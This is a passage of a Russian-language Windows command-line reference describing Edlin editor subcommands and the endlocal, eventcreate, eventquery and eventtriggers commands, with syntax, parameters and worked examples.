отсутствуют

Примечания
- - Если редактируемый файл не был загружен с диска, а создан программой Edlin, резервная копия (с расширением .bak) не будет создаваться. - Редактируемый файл записывается в то место на диске, которое было задано при запуске программы Edlin. Если имя диска пропущено, файл будет записан на текущий диск. Если имя каталога пропущено, файл будет записан в текущий каталог. - Перед использованием подкоманды e необходимо удостовериться в наличии на диске свободного места, достаточного для сохранения редактируемого файла. В противном случае, часть файла может быть потеряна. - Если при сохранении редактируемого файла на диске резервная копия (файл с расширением .BAK) оказывается защищенным от записи, будет выведено сообщение о невозможности заменить .BAK файл:

Нет доступа - [диск:][путь] имя_файла.bak

При этом сам файл и его копия не изменятся.
========================================================================================
Edlin: i (insert)

Вставляет строки перед заданой строкой редактируемого файла. При использовании команды i без параметров вставка производится в текущую строку.
Синтаксис

i [строка]
Параметры

строка
    Задает номер строки, перед которой будет сделана вставка. Значением параметра строка по умолчанию является текущая строка.

Примечания
- - Использование подкоманды i

При создании нового файла команда i должна быть выполнена перед добавлением новых строк. При каждом нажатии на клавишу ENTER будет выводиться номер следующей строки. Чтобы выйти из режима вставки, используйте сочетание клавиш CTRL+C.
- Изменение нумерации строк

При выходе из режима вставки последняя вставленная строка становится текущей. Для просмотра обновленной нумерации следует ввести подкоманду l (list) в командную строку вида *.
- Управляющие символы

Чтобы вставить в текст управляющий символ, введите:

^V символ_ASCII

Параметр символ_ASCII указывает на соответствующий символ, служащий управляющим символом. Например, символ ESC (CTRL+[) может быть введен следующим образом:

^V[

Управляющий символ "гудок" (CTRL+G) может быть введен следующим образом:

^VG
- Добавление текста

Если значение параметра строка превосходит число строк в редактируемом файле или если для параметра строка указан символ (#), Edlin добавляет вставляемые строки в конец файла. В любом случае, последняя вставленная строка становится текущей. Если в память загружена только часть файла, строки будут добавлены в конец этой части.
Примеры

После использования подкоманды l на экране появляется следующий текст:

1: Уважаемый г. Мут:
2:
3: Поздравляю с назначением
4: на должность старшего
5: инженера. Нахожусь под большим
6: впечатлением от результатов Вашей работы.
7:
8: С уважением,
9:
10: Профессор Бондаренко

Для добавления строк перед строкой номер 8 введите:

8I

Программа Edlin.exe выведет на экран следующее:

8:*_

В строке 8 введем следующий текст, начиная с позиции курсора:

8:*Я думаю, Вам будет приятно работать с

Закончив набор каждой новой строки, нажимайте клавишу ENTER. Введите теперь:

9: *доктором Петровым над новым проектом. Пожалуйста
10: *сообщите
11: *чем я могу Вам помочь.

Программа Edlin.exe выведет на экран следующее:

12:*_

Вставим пустую строку нажатием клавиши ENTER и завершим работу в режиме вставки, использовав сочетание клавиш CTRL+C в следующей строке. Введите команду 1l для просмотра обновленной нумерации строк:

1: Уважаемый г. Федоров:
2:
3: Поздравляю с назначением
4: на должность старшего
5: инженера. Нахожусь под большим
6: впечатлением от результатов Вашей работы.
7:
8: Я думаю, для Вас будет приятно работать с
9: доктором Петровым над новым проектом. Пожалуйста
10: сообщите
11: чем я могу Вам помочь.
12:
13: *С уважением,
14:
15: Профессор Бондаренко
========================================================================================
Edlin: l (list)

Выводит на экран заданый набор строк. При использовании команды l без параметров на экран выводится до одной страницы с текстом, начинающимся за 11 строк до текущей строки.
Синтаксис

l [строка1][,строка2]
Параметры

строка1
    Задает первую строку, выводящуюся на экран программой Edlin.exe.
строка2
    Задает последнюю строку, выводящуюся на экран программой Edlin.exe.
?
    Выводит список подкоманд команды edlin.

Примечания
- Пропуск значений параметров

Оба параметра или один из параметров строка1 и строка2 могут быть пропущены. Следующий список содержит значения по умолчанию для каждого такого случая.
- Если пропущен только параметр строка1, на экран будет выведено до 1 страницы текста (то есть, весь экран будет им заполнен), начинающейся на 11 строк раньше текущей строки и заканчивающейся строкой, задаваемой параметром строка2. Если пропущен только параметр строка1, обязательно должна быть введена заменяющая его запятая.- Если пропущен только параметр строка2, на экран будет выведено до страницы текста, начиная со строки, заданной параметром строка1.- Если подкоманда l (List) используется без параметров, на экран будет выведено до страницы текста, начинающейся на 11 строк раньше текущей строки. При установке драйвера дисплея Ansi.sys количество выводимых на одной странице строк зависит от типа используемого дисплея. Это число может быть больше 24. - Работа с большими фрагментами текста

Если текстовый блок превосходит объем одной страницы, вначале будет выведена первая страница, а затем следующее сообщение, позволяющее управлять просмотром оставшейся части текста:

Продолжить [Y(да)/N(нет)]?

При каждом ответе "Да" на экран выводится еще одна страница.
Примеры

Следующая команда выведет строки с 5 по 10:

5,10l
========================================================================================
Edlin: [line]

Выводит строку с заданным номером на экран.
Синтаксис

[строка]
Параметры

строка
    Задает номер строки для вывода на экран. Для вывода номера и содержимого текущей строки нажмите клавишу ENTER.
?
    Выводит список подкоманд edlin.

Примечания
- Если в качестве команды введен номер строки, на экран будут выведены две строки. Первая содержит номер строки и относящейся к строке текст. Вторая содержит номер строки и курсор. Первая строка служит шаблоном для редактирования строки текста во второй строке экрана. Текст может быть заменен, отредактирован, либо оставлен без изменений, для чего нажимается клавиша ENTER без ввода нового текста. После редактирования строки нажмите клавишу ENTER для записи изменений в память.

Внимание!
- Если клавиша ENTER была нажата, когда курсор находился в середине строки, часть строки, находящаяся правее курсора, будет удалена.

Чтобы получить сведения о сохранении редактируемого файла на диске, выберите подкоманды e (Конец) или w (Запись) из списка в ссылке «».
Примеры

В этом примере файл загружен в память и допускает редактирование. При использовании подкоманды l программа Edlin.exe выводит на экран содержимое файла.

1: Уважаемый г. Федоров:
2:
3: Поздравляю с назначением
4: на должность старшего
5: инженера. Нахожусь под большим
6: впечатлением от результатов Вашей работы.

Чтобы отредактировать строку 6, введите:

6

Программа Edlin.exe выведет на экран следующее:

6:* впечатлением от результатов Вашей работы.
6:*_

Первая строка содержит номер указаной строки и соответствующий текст. Вторая строка содержит тот же номер и курсор.

Чтобы вставить слово "отличной" перед словом "работы" (см. предыдущий пример), следует добиться повторного вывода после курсора на второй строке части первой строки. Для этого вначале нажмите клавишу F2, затем, введите р. Будут выведены символы от начала шестой строки до первого символа «р», как показано ниже:

6:* впечатлением от _

Нажмите клавишу F2 и снова введите р. На экран будет выведена строка вплоть до следующей буквы "р", как показано ниже:

6:* впечатлением от результатов Вашей _

Нажмите клавишу INSERT, введите отличной, нажмите клавишу ПРОБЕЛ, а затем — клавишу F3. Программа выведет на экран редактируемую строку:

6:* впечатлением от результатов Вашей отличной работы.

Нажмите клавишу ENTER для подтверждения изменений.

Для просмотра измененного файла после приглашения * введите подкоманду l (list). Программа Edlin.exe выведет на экран следующее:

1: Уважаемый г. Федоров:
2:
3: Поздравляю с назначением
4: на должность старшего
5: инженера. Нахожусь под большим
6*: впечатлением от результатов Вашей отличной работы.
========================================================================================
Edlin: m (move)

Перемещает блока последовательно расположенных строк на другое место в редактируемом файле.
Синтаксис

[строка1],[строка2],строка3m

[строка1],[+n],строка3m
Параметры

строка1
    Задает номер первой строки для перемещения.
строка2
    Задает номер последней строки для перемещения.
строка3
    Обязательный параметр. Задает номер строки, перед которой будут помещены перемещаемые строки.
+n
    Задает число строк в перемещаемом блоке, начинающемся со строки строка1 и включающего следующие n строк. Если опущен параметр строка1, текстовый фрагмент будет вставлен в текущую строку.

Примечания
- Изменение нумерации строк

Для просмотра обновленной нумерации можно использовать команду l.
- Перемещение с перекрытием

Номер строки, заданный параметром строка3, не может находиться внутри набора перемещаемых строк. Например, следующая команда будет ошибочной:

5,100,8m

В этом случае операция перемещения не может быть выполнена полностью и на экран будет выведено сообщение:

Ошибка ввода
Примеры

В этом примере файл загружен в память и допускает редактирование. При использовании подкоманды l программа Edlin.exe выводит на экран содержимое файла.

1: Уважаемый г. Федоров:
2:
3: Поздравляю с назначением
4: на должность старшего
5: инженера. Нахожусь под большим
6: впечатлением от результатов Вашей отличной работы.
7:
8: Я думаю, для Вас будет приятно работать с
9: доктором Петровым над новым проектом. Пожалуйста
10: сообщите
11: чем я могу Вам помочь.
12:
13: С уважением,
14:
15: Профессор Бондаренко
16: ООО Контеско
17: мировой лидер в химической технологии

Чтобы переместить название и девиз компании в начало (то есть, поставить строки 16 и 17 перед строкой 1), введите:

16,17,1m

Для просмотра измененного файла после приглашения * введите подкоманду l (list). Программа Edlin.exe выведет на экран следующее:

1: ООО Контеско
2: мировой лидер в химической технологии
3: Уважаемый г. Федоров:
4:
5: Поздравляю с назначением
6: на должность старшего
7: инженера. Нахожусь под большим
8: впечатлением от результатов Вашей отличной работы.
9:
10: Я думаю, для Вас будет приятно работать с
11: доктором Петровым над новым проектом. Пожалуйста
12: сообщите
13: чем я могу Вам помочь.
14:
15: С уважением,
16:
17: Профессор Бондаренко

Чтобы переместить блок строк, начинающийся с текущей строки и заканчивающийся через 25 строк, перед строкой 100, введите:

,+25,100m
========================================================================================
Edlin: p (page)

Производит постраничное отображение файла или его части (т. е. по одному полному экрану текста). Если параметры не указаны, команда p отобразит страницу текста, начиная со строки, следующей за текущей.
Синтаксис

[строка1][, строка2]p
Параметры

строка1
    Указывает первую строку, которую требуется вывести на экран программой Edlin.exe.
строка2
    Указывает последнюю строку, которую требуется вывести на экран программой Edlin.exe.
?
    Отображает список подкоманд команды edlin.

Примечания
- Последняя выведенная на экран строка становится текущей для нового экрана. - Пропуск параметров

Когда пропущен параметр строка1, программа Edlin.exe выведет страницу текста с текущей строки по строку, задаваемую параметром строка2. Когда пропущен параметр строка2, программа Edlin.exe выведет страницу текста со строки, задаваемой параметром строка1. Когда пропущены оба параметра строка1 и строка2, программа Edlin.exe выведет страницу текста со строки, следующей за текущей.
Примеры

Для постраничного просмотра текста со строки с номером 100 по строку с номером 200 введите:

100,200p
========================================================================================
Edlin: q (quit)

Останавливает работу программы Edlin без записи редактируемого файла на диск.
Синтаксис

q
Параметры

нет параметров

Примечания
- Для записи редактируемого файла из памяти на диск перед окончанием работы программы следует использовать подкоманду e (end). 
========================================================================================
Edlin: r (replace)

Осуществляет поиск в блоке текста строки из одного или более указанных символов и заменяет каждое ее вхождение другой указанной строкой.
Синтаксис

[строка1][,строка2][?]r[строка_поиска][CTRL+Zстрока_замены]
Параметры

строка1
    Задает первую строку блока текста, в котором будет производиться замена строки строка_поиска.
строка2
    Задает последнюю строку блока текста, в котором будет производиться замена строки, заданной параметром строка_поиска.
?
    Запрашивает подтверждение перед тем, как программа Edlin.exe выполнит замену вхождения строки, заданной параметром строка_поиска.
строка_поиска
    Задает строку, которую следует найти и заменить.
CTRL + Z
    Эта комбинация клавиш отделяет значения параметров строка_поиска и строка_замены. В качестве разделителя должен быть использован только символ конца файла (CTRL+Z), который на экране будет выглядеть как ^Z.
строка_замены
    Задает новую строку, которая будет вставлена в текст вместо строки, заданной параметром строка_поиска.

Примечания
- Последней строкой, в которой программой Edlin.exe производится замена строки строка_поиска, является новая текущая строка. - Использование пробелов в командной строке

Не допускается ввод пробелов между командой r и ее параметрами.
- Пропуск параметров

Если параметр строка1 не задан, программа Edlin.exe начинает поиск со строки, следующей за текущей. Если параметр строка2 не задан, программа Edlin.exe закончит поиск в последней строке файла или части файла, которая находится в памяти.

Если параметр строка_поиска не задан, программа Edlin.exe будет использовать строку, заданную в параметре строка_поиска1 при последнем использовании подкоманд r или s в течение этого сеанса. Если параметр строка_поиска не задан и подкоманды r или s не были использованы в течение текущего сеанса, подкоманда r будет немедленно остановлена.

Если не был задан параметр строка_замены, программа Edlin.exe будет использовать последнее значение этого параметра для команды r в течение текущего сеанса. Если параметр строка_замены не задан, а команда r в течение текущего сеанса редактирования не применялась, программа Edlin.exe удалит все вхождения строки, заданной параметром строка_поиска, в заданном блоке текста.
- Использование сочетания клавиш CTRL+Z

Следует разделять значения параметров строка_поиска и строка_замены с помощью сочетания клавиш CTRL+Z. Даже если параметр строка_поиска был пропущен, следует нажать клавиши CTRL+Z для обозначения начала параметра строка_замены. При нажатии клавиш CTRL+Z, на экране появятся следующие символы.

^Z
- Использование знака вопроса (?)

Если параметр ? включен в команду, программа Edlin.exe отобразит строку с первым вхождением строки, заданной параметром строка_поиска, и выведет следующий запрос о подтверждении замены.

O.K.? _

При нажатии клавиш Y или ENTER программа Edlin.exe произведет замену вхождения строки_поиска на строку_замены и продолжит поиск следующего вхождения. При нажатии клавиши N замена данного появления строки_поиска производиться не будет и редактор продолжит поиск дальше по тексту.

Если для подтверждения замен параметр ? не использовался, программа Edlin.exe произведет все замены строки_поиска за один раз и затем выведет на экран строки, в которых были сделаны замены. Если в одной строке было произведено несколько замен, программа выведет эту строку один раз для каждой произведенной замены.
Примеры

Чтобы заменить каждое вхождения слова «mine» на слово «ours» в первых 20 строках редактируемого файла и получить запрос на подтверждение замены, введите следующую команду, но не нажимайте клавишу ENTER.

1,20?rmineCTRL+Zours

CTRL+Z отображается на экране как ^Z. Команда отображается на экране следующим образом:

1,20?rmine^Zours

В этом примере файл, загруженный в память для редактирования, выглядит как показано ниже. При использовании подкоманды l (list — список) программа Edlin.exe выводит на экран содержимое файла.

1: Dear Mr. Muth:
2:
3: Congratulations on your promotion
4: to the position of Senior Chemical
5: Engineer. I continue to be most
6: impressed with your fine work.
7:
8: I think you will enjoy working with
9: Mr. Lang on the new project. Please
10: let me know if there is anything I
11: can do to assist you.
12:
13: Sincerely,
14:
15: Clay Martin, President
16: Contoso, Ltd
17: "A World Leader in Technology"

Чтобы заменить все вхождения слова «I» на слова «yours truly» в строках с 5 по 10 без получения запроса на подтверждение удаления, введите следующее.

5,10rICTRL+Zyours truly

CTRL+Z отображается на экране как ^Z. Команда отображается на экране следующим образом:

5,10rI^Zyours truly

Так как параметр ? не использовался, все три замены будут произведены программой Edlin.exe без запроса на подтверждение удаления. Когда команда будет выполнена, на экран будут выведены строки, получившиеся после произведения замен.

5: Engineer. yours truly continue to be most
8: yours truly think you will enjoy working with
10: let me know if there is anything yours truly

В приведенном выше примере произведено две непредусмотренные замены в строках 5 и 8. Чтобы избежать этого, добавьте в команду параметр ?. Окончательный вид команды будет следующим:

5,10?rI^Zyours truly

Теперь для каждого вхождения строки, заданной параметром строка_поиска, будет выводиться запрос на подтверждение удаления и будут выполняться только подтвержденные замены, как показано ниже.

5: Engineer. yours truly continue to be most
O.K.? n
8: yours truly think you will enjoy working with
O.K.? n
10: let me know if there is anything yours truly
O.K.? y

Когда используется параметр ? измененные строки не будут автоматически выведены на экран. Для просмотра изменений может быть использована подкоманда l (list). Программа Edlin.exe отобразит отредактированный файл, который будет иметь следующий вид.

1: Dear Mr. Muth:
2:
3: Congratulations on your promotion
4: to the position of Senior Chemical
5: Engineer. I continue to be most
6: impressed with your fine work.
7:
8: I think you will enjoy working with
9: Mr. Lang on the new project. Please
10: let me know if there is anything yours truly
11: can do to assist you.
12:
13: Sincerely,
14:
15: Clay Martin, President
16: Contoso, Ltd
17: "A World Leader in Technology"
========================================================================================
Edlin: s (search)

Производит поиск файла по заданной строке.
Синтаксис

[строка1][,строка2][?]s[строка_поиска]
Параметры

строка1
    Задает первую строку области поиска.
строка2
    Задает последнюю строку области поиска.
?
    Запрашивает подтверждение перед тем, как программа Edlin.exe найдет первое вхождение строки, заданной параметром строка_поиска.
строка_поиска
    Задает строку, которую необходимо найти в тексте. При вызове команды s дополнительные пробелы перед этим параметром недопустимы, так как они будут рассматриваться как часть строки поиска.

Примечания
- Программа Edlin.exe выведет на экран все строки в заданной области файла, содержащие строку поиска. После того, как первое вхождение найдено, процесс поиска останавливается и строка, содержащая строку_поиска становится текущей. - Пропуск параметров

Если параметр строка1 не задан, программа Edlin.exe начинает поиск со строки, следующей за текущей. Если параметр строка2 не задан, поиск будет закончен в последней строке файла.

Если параметр строка_поиска не задан, программа Edlin.exe будет использовать строку, заданную в параметре строка_поиска1 при последнем использовании подкоманд r или s в течение этого сеанса. Если параметр строка_поиска не задан и подкоманды r или s не были использованы в течение текущего сеанса, подкоманда s будет немедленно остановлена.
- Использование параметра ?

Если параметр ? включен в команду, программа Edlin.exe отобразит строку с первым вхождением строки, заданной параметром строка_поиска, и выведет следующий запрос о подтверждении.

O.K.? _

При нажатии клавиш Y или ENTER строка, выведенная перед сообщением, становится текущей и поиск останавливается. При нажатии клавиши N поиск будет продолжен до тех пор, пока строка поиска не будет найдена снова или пока не появится сообщение следующего вида, информирующее о просмотре всех заданных строк.

Не найден
Примеры

В этом примере файл, загруженный в память для редактирования, выглядит как показано ниже. При использовании подкоманды l (list — список) программа Edlin.exe выводит на экран содержимое файла.

1: Dear Mr. Muth:
2:
3: Congratulations on your promotion
4: to the position of Senior Chemical
5: Engineer. I continue to be most
6: impressed with your fine work.
7:
8: I think you will enjoy working with
9: Mr. Lang on the new project. Please
10: let me know if there is anything I
11: can do to assist you.
12:
13: Sincerely,
14:
15: Clay Martin, President

Чтобы задать поиск в строках со 2 по 12 первого появления слова «to», введите следующую команду:

2,12sto

Программа Edlin.exe выведет следующую строку.

4: to the position of Senior Chemical

Чтобы отобразить строку с первым вхождением слова «to» и получить запрос на подтверждение, введите:

1,?sto

Программа Edlin.exe выведет следующие строки.

4: to the position of Senior Chemical
O.K.? _

Если будет нажата любая клавиша, отличная от Y или ENTER, поиск будет продолжен. Например, если введен символ N, как показано ниже:

O.K.? n

Программа Edlin.exe продолжит поиск до следующей строки и выведет на экран следующее.

5: Engineer. I continue to be most
O.K.? _

Для окончания поиска нажмите клавишу Y.
========================================================================================
Подкоманды Edlin

Для получения дополнительных выберите одну из ссылок.
- Edlin: [line]- Edlin: a (append)- Edlin: c (copy)- Edlin: d (delete)- Edlin: e (end)- Edlin: i (insert)- Edlin: l (list)- Edlin: m (move)- Edlin: p (page)- Edlin: q (quit)- Edlin: r (replace)- Edlin: s (search)- Edlin: t (transfer)- Edlin: w (write) 
========================================================================================
Edlin: t (transfer)

Производит объединение редактируемого файла с другим файлом на диске.
Синтаксис

[строка]t[диск:][путь] имя_файла
Параметры

строка
    Задает номер строки, перед которой будет вставлено содержимое другого файла. Значением по умолчанию является текущая строка.
[диск:][путь] имя_файла
    Задает размещение и имя файла, который требуется вставить перед строкой, заданной параметром строка. Параметр имя_файла является обязательным. По умолчанию считается, что диск является текущим диском, а путь указывает на текущий каталог.

Примечания
- Для просмотра обновленной нумерации строк после объединения файлов может быть использована команда Edlin l (list).
Примеры

Для того чтобы вставить содержимое файла Taxes.mem в строку номер 12 редактируемого файла, введите:

12t taxes.mem
========================================================================================
Edlin: w (write)

Производит запись первой части редактируемого файла на диск. Если команда w используется без параметров, то запись из редактируемого файла на диск производится до тех пор, пока не заполнится 25 процентов памяти.
Синтаксис

[число_строк]w
Параметры

число_строк
    Задает количество строк, которые будут записаны на диск. Запись начинается с первой строки, находящейся в памяти.
?
    Отображает список подкоманд команды edlin.

Примечания
- При запуске программы Edlin в память загружается столько строк файла, сколько позволяет объем свободной памяти. Если размер файла больше, чем объем свободной памяти, следует редактировать файл в несколько этапов. Если редактируется часть файла, то для ее записи на диск используется подкоманда w, а для загрузки следующей части — подкоманда a (append). - При загрузке файла программа Edlin считывает строки с диска в память до тех пор, пока не будет заполнено 75 процентов памяти. Оставшиеся 25 процентов резервируются для сохранения добавлений, сделанных в процессе редактирования. Если файл полностью поместился в памяти, на экран будет выведено следующее сообщение.

Конец входного файла

Если это сообщение появилось в процессе загрузки, то необходимости в использовании подкоманд w и a (append) нет.

Если же такого сообщения не было выведено на экран, это означает, что файл не поместился в памяти полностью. Следует производить редактирование по частям, с использованием команд w и a для записи очередной редактируемой части файла и загрузки следующей части соответственно.

Команда w не производит записи на диск изменений в случае, когда в этом нет необходимости. При использовании команды w для файла, целиком разместившегося в памяти, после выхода из редактора edlin с помощью команды q (quit) изменения не будут сохранены.
- Изменение нумерации строк

После записи программой edlin первой части файла на диск можно использовать команду l (list) для просмотра нумерации оставшихся строк, начиная со строки номер 1.
Примеры

Предположим, что последние 100 строк редактируемого файла не поместились в памяти. Чтобы освободить достаточно пространства для загрузки оставшейся части файла и продолжить редактирование, введите:

125w
========================================================================================
Endlocal

Окончание использования локального окружения в пакетной программе, восстановление значений переменных среды, имевшихся до выполнения соответствующей команды setlocal.
Синтаксис

endlocal
Параметры

/?
    Отображение справки в командной строке.

Примечания
-Команду endlocal необходимо указать в сценарии и пакетном файле. Команда endlocal не выполняется при использовании вне сценария или пакетного файла.- В конце пакетного файла присутствует неявная команда endlocal. - Если расширения командного процессора разрешены (установлено по умолчанию), команда endlocal восстанавливает состояния (т. е. разрешение или запрещение) расширений команд, существовавшие до выполнения соответствующей команды setlocal. Дополнительные сведения о разрешении и запрещении расширений командного процессора см. в разделе cmd, доступном по ссылке «».
Примеры

В пакетном файле можно локально изменить переменные среды. Например:

@echo off

rem Эта программа запускает приложение superapp в сети,

rem записывает вывод в файл и загружает этот файл в программу

rem Блокнот.

setlocal

path=g:\programs\superapp;%path%

call superapp>c:\superapp.out

endlocal

start notepad c:\superapp.out
========================================================================================
Eventcreate

Позволяет администратору создать особое событие в указанном журнале событий.
Синтаксис

eventcreate [/s компьютер [/u домен\пользователь [/p пароль]] {[/l {APPLICATION|SYSTEM}]|[/so имя_источника]} /t {ERROR|WARNING|INFORMATION|SUCCESSAUDIT|FAILUREAUDIT} /id код_события /d описание
Параметры

/s компьютер
    Задание имени или IP-адреса удаленного компьютера (не используйте обратную косую черту). По умолчанию используется локальный компьютер.
/u домен\пользователь
    Выполнение команды с разрешениями учетной записи пользователя, заданного в параметре пользователь или домен\пользователь. По умолчанию используются разрешения текущего вошедшего пользователя компьютера, с которого поступила эта команда.
/p пароль
    Указание пароля учетной записи пользователя, заданной параметром /u.
/l {APPLICATION|SYSTEM}
    Задание имени журнала событий, в котором будет создано данное событие. Для журнала событий допустимыми являются имена APPLICATION и SYSTEM.
/so имя_источника
    Задание источника, используемого для данного события. Допустимый источник может быть представлен любой строкой и должен указывать на приложение или компонент, в котором произошло событие.
/t {ERROR|WARNING|INFORMATION|SUCCESSAUDIT|FAILUREAUDIT}
    Задание типа создаваемого события. Допустимыми являются следующие типы: ERROR, WARNING, INFORMATION, SUCCESSAUDIT и FAILUREAUDIT.
/id код_события
    Задание кода события. Допустимым кодом может быть любое число от 1 до 65535.
/d описание
    Задание описания для вновь создаваемого события. 
/?
    Отображение справки в командной строке.

Примечания
- Особые события не заносятся в журнал безопасности.
Примеры

Далее приведены примеры использования команды eventcreate:

eventcreate /t error /id 100 /l application /d "Создание события в журнале приложения"
eventcreate /t information /id 1000 /so winmgmt /d "Создание события в источнике WinMgmt"
eventcreate /t error /id 2001 /so winword /l application /d "новый источник Winword в журнале приложений"
eventcreate /s server /t error /id 100 /l application /d "Удаленный компьютер без учетных данных пользователя"
eventcreate /s server /u user /p password /id 100 /t error /l application /d "Удаленный компьютер с учетными данными пользователя"
eventcreate /s server1 /s server2 /u user /p password /id 100 /t error /so winmgmt /d "Создание событий на нескольких удаленных компьютерах"
eventcreate /s server /u user /id 100 /t warning /so winmgmt /d "Удаленный компьютер с частью учетных данных пользователя"
========================================================================================
Eventquery.vbs

Вывод списка событий и их свойств из одного или нескольких журналов событий.
Синтаксис

eventquery[.vbs] [/s компьютер [/u домен\пользователь [/p пароль]]] [/fi имя_фильтра] [/fo {TABLE|LIST|CSV}] [/r диапазон_событий [/nh] [/v] [/l [APPLICATION] [SYSTEM] [SECURITY] ["DNS server"] [заданный_пользователем_журнал] [имя_журнала_каталога] [*] ]
Параметры

/s компьютер
    Задание имени или IP-адреса удаленного компьютера (не используйте обратную косую черту). По умолчанию используется локальный компьютер.
/u домен\пользователь
    Выполнение сценария с разрешениями учетной записи пользователя, заданного в параметре пользователь или домен\пользователь. По умолчанию используются разрешения текущего вошедшего пользователя компьютера, с которого поступила эта команда.
/p пароль
    Указание пароля учетной записи пользователя, заданной параметром /u.
/fi имя_фильтра
    Задание типов событий, которые следует включить в запрос или исключить из него. Чтобы найти события с каким-то значением, фильтры Type и ID можно использовать совместно в одной инструкции с помощью оператора or. Допустимыми именами фильтров, операторами и значениями являются следующие.
    Имя     Оператор     Значение
    Datetime     eq, ne, ge, le, gt, lt     мм/дд/гг(гггг), чч:мм:ссAM(/PM)
    Type     eq, ne, or     {ERROR|INFORMATION|WARNING|SUCCESSAUDIT|FAILUREAUDIT}
    ID     eq, ne, or, ge, le, gt, lt     Любое допустимое положительное число
    User     eq, ne     Любая допустимая строка
    Computer     eq, ne     Любая допустимая строка
    Source     eq, ne     Любая допустимая строка
    Category     eq, ne     Любая допустимая строка
/fo {TABLE|LIST|CSV}
    Задание формата выходных данных. Допустимые значения: table, list и csv.
/r диапазон_событий
    Задание диапазона событий, включаемых в список.
    Значение     Описание
    N     Включение в список последних событий, количество которых задается параметром N.
    -N     Включение в список самых старых событий, количество которых задается параметром N.
    N1-N2     Включение в список событий с N1 по N2.
/nh
    Запрещение вывода заголовков столбцов. Этот параметр является допустимым при задании форматов table и csv.
/v
    Задание отображения подробных сведений о событиях в выходных данных.
/l [APPLICATION] [SYSTEM] [SECURITY] ["DNS server"] [заданный_пользователем_журнал] [имя_журнала_каталога] [*] ]
    Задание журналов для просмотра. Допустимые значения: Application, System, Security, "DNS server", заданный пользователем журнал и журнал каталога. Значение "DNS server" является допустимым только в том случае, если на компьютере, заданном параметром /s, запущена служба DNS. Чтобы задать несколько журналов для просмотра, повторно воспользуйтесь параметром /l. Допускается использование подстановочного знака (*), который указывается по умолчанию.
/?
    Отображение справки в командной строке.

Примечания
- Чтобы выполнить данный сценарий, необходимо запустить CScript. Если программа CScript не является используемым по умолчанию сервером сценариев Windows, введите следующую команду:

cscript //h:cscript //s //nologo
Примеры

Далее приведены примеры использования команды eventquery:

eventquery /l system
eventquery /l mylog
eventquery /l application /l system
eventquery /s srvmain /u maindom\hiropln /p p@ssW23 /v /l *
eventquery /r 10 /l application /nh
eventquery /r -10 /fo LIST /l security
eventquery /r 5-10 /l "DNS server"
eventquery /fi "Type eq Error" /l application
eventquery /fi "Datetime eq 06/25/00,03:15:00AM/06/25/00,03:15:00PM" /l application
eventquery /fi "Datetime gt 08/03/00,06:20:00PM" /fi "id gt 700" /fi "Type eq warning" /l system eventquery /fi "ID eq 1000 OR ID ge 4500" eventquery /fi "Type eq error OR Type eq INFORMATION" eventquery /fi "ID eq 250 OR Type eq ERROR"
========================================================================================
Eventtriggers

Вывод и настройка триггеров событий на локальном или удаленном компьютере.

Чтобы ознакомиться с синтаксисом команды, щелкните ссылку.

eventtriggers create

Создание нового триггера событий, который отслеживает выполнение определенных условий в журнале событий и действует в соответствии с ними.
Синтаксис

eventtriggers[.exe] /create [/s компьютер [/u домен\пользователь [/p пароль]]] /tr имя_триггера [/l [APPLICATION] [SYSTEM] [SECURITY] ["DNS Server"] [LOG] [имя_журнала_каталога] [*] ] {[/eid код]|[/t {ERROR|INFORMATION|WARNING|SUCCESSAUDIT|FAILUREAUDIT}]|[/so источник]} [/d описание] /tk имя_задания [/ru {[домен\]пользователь | "System"} [/rp пароль]]
Параметры

/s компьютер
    Задание имени или IP-адреса удаленного компьютера (не используйте обратную косую черту). По умолчанию используется локальный компьютер.
/u домен\пользователь
    Выполнение команды с разрешениями учетной записи пользователя, заданного в параметре пользователь или домен\пользователь. По умолчанию используются разрешения текущего вошедшего пользователя компьютера, с которого поступила эта команда.
/p пароль
    Указание пароля учетной записи пользователя, заданной параметром /u.
/tr имя_триггера
    Задание понятного имени для триггера событий.
/l [APPLICATION] [SYSTEM] [SECURITY] ["DNS Server"] [LOG] [имя_журнала_каталога] [*] ]
    Задание журналов для просмотра. Допустимые типы: Application, System, Security, DNS server, Log и журнал каталога. Допускается использование подстановочного знака (*), который указывается в качестве значения по умолчанию. 
/eid код
    Задание кода определенного события, которое требуется отслеживать с помощью триггера событий. Допустимым значением является любое целое число. Этот параметр нельзя использовать вместе с параметрами /type или /so.
/t {ERROR|INFORMATION|WARNING|SUCCESSAUDIT|FAILUREAUDIT}
    Задание типа события, которое требуется отслеживать с помощью триггера событий. Допускаются следующие значения: ERROR, INFORMATION, WARNING, SUCCESSAUDIT и FAILUREAUDIT. Этот параметр нельзя использовать вместе с параметрами /id или /so.
/so источник
    Задание источника события, которое требуется отслеживать с помощью триггера событий. Допустимым значением является любая строка. Этот параметр нельзя использовать вместе с параметрами /id или /type.
/d описание
    Задание вывода подробного описания триггера событий. Допустимым значением является любая строка.
/tk имя_задания
    Указание задания, команды или строки, выполняемых при соблюдении условий триггера событий.
/ru {[домен\]пользователь | "System"}
    Выполнение заданий с разрешениями указанной учетной записи пользователя. По умолчанию задание выполняется с разрешениями пользователя, вошедшего в компьютер, на котором запущена программа SchTasks.
Значение     Описание
[домен\]пользователь     Задание учетной записи пользователя.
"System" или ""     Задание учетной записи NT Authority\System, используемой в операционной системе.
/rp пароль
    Указание пароля учетной записи пользователя, заданной параметром /ru. Если при указании учетной записи пропущен пароль, программа SchTasks.exe запросит пароль и скроет вводимый текст. Для заданий, выполняемых с разрешениями учетной записи NT Authority\System, не требуется пароль и программа SchTasks.exe его не запрашивает.
/?
    Отображение справки в командной строке.

Примеры

Далее приведены примеры использования команды eventtriggers /create:

eventtriggers /create /tr "Очистка диска" /l system /t error /tk c:\windows\system32\cleanmgr.exe
eventtriggers /create /s srvmain /u maindom\hiropln /p p@ssW23 /tr "Отсутствие места на диске" /eid 4133 /t warning /tk \\server\share\diskcleanup.cmd
eventtriggers /create /s srvmain /user maindom\hiropln /p p@ssW23 /tr "Создание резервной копии диска" /eid 4133 /l system /t error /tk \\server\share\ntbackup.exe

eventtriggers delete

Удаление триггера событий из системы с помощью его кода.
Синтаксис

eventtriggers[.exe] /delete [/s компьютер [/u домен\пользователь [/p пароль]]] /tid {код|*}
Параметры

/s компьютер
    Задание имени или IP-адреса удаленного компьютера (не используйте обратную косую черту). По умолчанию используется локальный компьютер.
/u домен\пользователь
    Выполнение команды с разрешениями учетной записи пользователя, заданного в параметре пользователь или домен\пользователь. По умолчанию используются разрешения текущего вошедшего пользователя компьютера, с которого поступила эта команда.
/p пароль
